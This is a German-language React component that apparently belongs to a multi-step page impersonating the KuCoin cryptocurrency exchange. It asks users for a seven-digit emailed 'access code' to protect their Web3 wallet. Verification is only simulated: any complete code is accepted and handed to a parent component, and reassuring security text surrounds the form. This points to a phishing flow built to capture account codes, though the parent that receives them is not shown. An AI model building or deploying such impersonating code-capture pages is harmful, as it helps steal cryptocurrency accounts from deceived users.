"use client"

import type React from "react"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import Header from "@/components/header"
import ProgressBar from "@/components/progress-bar" // Updated import
import { useState } from "react"

interface AccessCodeStepProps {
  onNext: () => void
  onCodeChange: (code: string) => void
  stepNumber: number
}

export default function AccessCodeStep({ onNext, onCodeChange, stepNumber }: AccessCodeStepProps) {
  const [code, setCode] = useState(["", "", "", "", "", "", ""])
  const [isLoading, setIsLoading] = useState(false)

  const handleInputChange = (index: number, value: string) => {
    if (value.length <= 1) {
      const newCode = [...code]
      newCode[index] = value
      setCode(newCode)

      // Auto-focus next input
      if (value && index < 6) {
        const nextInput = document.getElementById(`code-${index + 1}`)
        nextInput?.focus()
      }

      // Update parent component
      onCodeChange(newCode.join(""))
    }
  }

  const handleKeyDown = (index: number, e: React.KeyboardEvent) => {
    if (e.key === "Backspace" && !code[index] && index > 0) {
      const prevInput = document.getElementById(`code-${index - 1}`)
      prevInput?.focus()
    }
  }

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    setIsLoading(true)

    // Simulate API verification
    await new Promise((resolve) => setTimeout(resolve, 1500))

    setIsLoading(false)
    onNext()
  }

  const isCodeComplete = code.every((digit) => digit !== "")

  return (
    <div className="min-h-screen bg-white flex flex-col">
      <Header />
      <ProgressBar currentStep={stepNumber} totalSteps={4} />

      <div className="flex-1 px-4 md:px-8 max-w-2xl mx-auto w-full">
        <div className="mb-8">
          <h1 className="text-3xl font-bold text-gray-900 mb-4">Geben Sie Ihren KuCoin Zugangscode ein</h1>
          <p className="text-gray-600 text-lg leading-relaxed">
            Dieser <span className="font-semibold">Zugangscode</span> sollte Ihnen per E-Mail zugestellt worden sein. So
            können wir Ihre KuCoin Web3 Wallet schützen, indem wir Ihre Identität überprüfen.
          </p>
        </div>
        <div className="mb-8">
          <form onSubmit={handleSubmit}>
            <div className="flex gap-3 mb-8 justify-center sm:justify-start">
              {code.map((digit, index) => (
                <Input
                  key={index}
                  id={`code-${index}`}
                  type="text"
                  value={digit}
                  onChange={(e) => handleInputChange(index, e.target.value)}
                  onKeyDown={(e) => handleKeyDown(index, e)}
                  className="w-12 h-12 sm:w-14 sm:h-14 text-center text-xl font-semibold border-2 border-gray-300 rounded-lg focus:border-[#24AE8F] focus:ring-0"
                  maxLength={1}
                />
              ))}
            </div>

            <Button
              type="submit"
              className="w-full h-14 bg-[#24AE8F] hover:bg-[#1E9B7A] text-white font-semibold text-lg rounded-lg"
              disabled={!isCodeComplete || isLoading}
            >
              {isLoading ? "Wird überprüft..." : "Fortfahren"}
            </Button>
          </form>
        </div>
        {/* Info Box */}
        <div className="bg-gray-50 border border-gray-200 rounded-lg p-6">
          <div className="flex items-start gap-3">
            <div className="w-5 h-5 rounded-full border border-gray-400 flex items-center justify-center flex-shrink-0 mt-1">
              <span className="text-gray-600 text-xs font-bold">i</span>
            </div>
            <div>
              <h3 className="font-semibold text-gray-900 mb-2">Hinweis</h3>
              <p className="text-gray-700 text-sm leading-relaxed">
                Die Sicherheit Ihrer Assets hat höchste Priorität: KuCoin schützt Krypto-Assets mit umfangreichen
                Sicherheitsmaßnahmen und bewahrt sie in regelmäßig geprüften Cold Wallets auf – Ihre Assets bleiben
                stets Ihr Eigentum.
              </p>
            </div>
          </div>
        </div>
      </div>
    </div>
  )
}
